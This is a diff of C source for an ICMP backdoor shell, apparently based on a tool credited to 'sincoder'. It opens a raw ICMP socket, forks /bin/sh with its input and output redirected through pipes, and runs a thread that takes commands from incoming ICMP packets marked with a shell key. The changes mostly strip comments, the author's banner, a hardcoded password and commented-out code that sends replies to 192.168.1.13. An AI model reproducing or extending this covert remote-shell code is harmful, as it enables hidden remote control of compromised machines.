@@ -23,7 +23,6 @@ typedef unsigned char uint8;
         printf(fmt,__VA_ARGS__); \
     }while(0);
 
-//#define IN_BUF_SIZE   1024  //接收数据的缓冲区的大小
 #define MAX_BUFF_SIZE  1000 // max data size can send
 #define SLEEP_TIME 1000
 #define IN_BUF_SIZE 1024
@@ -60,21 +59,16 @@ struct packet_header
 
 
 int  g_icmp_sock = 0;
-int  g_CanThreadExit = 0; //线程是不是可以退出了。
-int  read_pipe[2];  //读取的管道
+int  g_CanThreadExit = 0; 
+int  read_pipe[2];  
 int  write_pipe[2];
 char *g_MyName = NULL;
-uint32 g_RemoteIp = 0;// 远程 ip
-char *g_Cmd = NULL; //要执行的命令
-char *g_Request = NULL;//请求的数据吧
-char *g_password = "sincoder"; //通信的密码
+uint32 g_RemoteIp = 0;
+char *g_Cmd = NULL; 
+char *g_Request = NULL;
 int  g_child_pid = 0;// pid of sh
-char *g_hello_msg = "Icmp Shell V1.0 \n\
-By: sincoder \n\
-command:\n\
-\trestartshell\n";
 uint32 g_bind_ip = 0;
-//char g_output_buffer[MAX_BUFF_SIZE] = {0};  //缓存要发送的数据
+
 pthread_mutex_t g_output_mutex;
 buffer_context g_output_buffer = {0};
 
@@ -205,8 +199,7 @@ void *receive_icmp_data(void *lparam){
           fflush(stdout);
         }
 
-          //char *shell_key = "n0xsh_";
-          //printf("start");
+          
           char *verify;
           verify = strstr(data, shell_key);
           //printf("PONTEIRO: %c", *verify);
@@ -254,39 +247,12 @@ void *receive_icmp_data(void *lparam){
 
 
       }
-      //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), commandoutput, sizeof(commandoutput));
-
-		// reuse headers
-		  //icmp->type = 0;
-		  //addr.sin_family = AF_INET;
-		  //addr.sin_addr.s_addr = ip->saddr;
-
-		// read data from stdin
-		  //nbytes = read(0, out_buf, OUT_BUF_SIZE);
-		  //if (nbytes > -1) {
-			  //memcpy((char *) (icmp + 1), out_buf, nbytes);
-			  //out_size = nbytes;
-		  //} else {
-			  //out_size = 0;
-		  //}
-
-		  //icmp->checksum = 0x00;
-		  //icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + out_size);
-
-		// send reply
-		  //nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + out_size, 0, (struct sockaddr *) &addr, sizeof(addr));
-		  //if (nbytes == -1) {
-			  //perror("sendto");
-			 // return -1;
-		 // }
 
 }}}
 
 int main(int argc, char **argv){
     int pid;
-    g_MyName = argv[0]; //保存下
-    //atexit(OnExit);
-    // create raw ICMP socket
+    g_MyName = argv[0]; 
     g_icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (g_icmp_sock == -1)
     {
@@ -294,8 +260,7 @@ int main(int argc, char **argv){
         return -1;
     }
 
-    //bind(g_icmp_sock,)
-    //要 不用 Bind 一个本地的ip 只接收来自远程的 包
+    
 
     pipe(read_pipe);
     pipe(write_pipe);
@@ -304,66 +269,26 @@ int main(int argc, char **argv){
 
     if (0 == g_child_pid)
     {
-        //进入子进程
-        //启动 shell 进程
+    
         close(g_icmp_sock); // child do not need
         close(read_pipe[0]);
         close(write_pipe[1]);
         char *argv[] = {"/bin/sh", NULL};
         char *shell = "/bin/sh";
-        dup2(write_pipe[0], STDIN_FILENO); //将输入输出重定向到管道
+        dup2(write_pipe[0], STDIN_FILENO); 
         dup2(read_pipe[1], STDOUT_FILENO);
         dup2(read_pipe[1], STDERR_FILENO);
-        execv(shell, argv); //启动 shell
+        execv(shell, argv); 
     }
     else
     {
-        //pthread_t hIcmpRecv;
-        //pthread_t hShellRead;
-        //close(read_pipe[1]);
-        //close(write_pipe[0]);
-        //buffer_init(&g_output_buffer);
-        //dbg_msg("child process id %d \n", g_child_pid);
-                //pthread_mutex_init(&g_output_mutex, NULL);
-        //启动一个线程来读取
-        //hIcmpRecv = MyCreateThread(Icmp_RecvThread, NULL);
-        //hShellRead = MyCreateThread(ShellPipe_ReadThread, NULL);
-
-
-        //if (0 == hIcmpRecv || 0 == hShellRead)
-        //{
-           // dbg_msg("%s:Create Thread exit ... \n", __func__);
-        //}
-        //waitpid(g_child_pid, NULL, 0); //等待子进程退出
-        //dbg_msg("%s:child exit. ..\n", __func__);
-        //write(g_icmp_soick,"sincoder",8);
-
-
-        //printf("Sending hello\n");
-
-        //hello();
-
-        //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
-        //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
+        
         pthread_t hIcmpRecv;
         hIcmpRecv = MyCreateThread(receive_icmp_data, NULL);
         //receive_icmp_data();
         close(g_icmp_sock);
         pthread_join(hIcmpRecv, NULL);
 
-        //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
-        //printf("HELLO SEND SUCESFULY\n");
-        //printf("data received\n");
-    ////icmp_sendrequest(g_icmp_sock, inet_addr("127.0.0.1"), "sincoder", 8);
-
-
-        //close(g_icmp_sock); //tell the icmp_recv thread exit ...
-        //close(read_pipe[0]);
-        //close(write_pipe[1]);
-        //dbg_msg("%s:wait thread exit ...\n", __func__);
-        //pthread_join(hIcmpRecv, NULL); //线程会因为上面的句柄关闭 而退出
-        //pthread_join(hShellRead, NULL);
-        //buffer_free(&g_output_buffer);
     }
     return 0;
 }
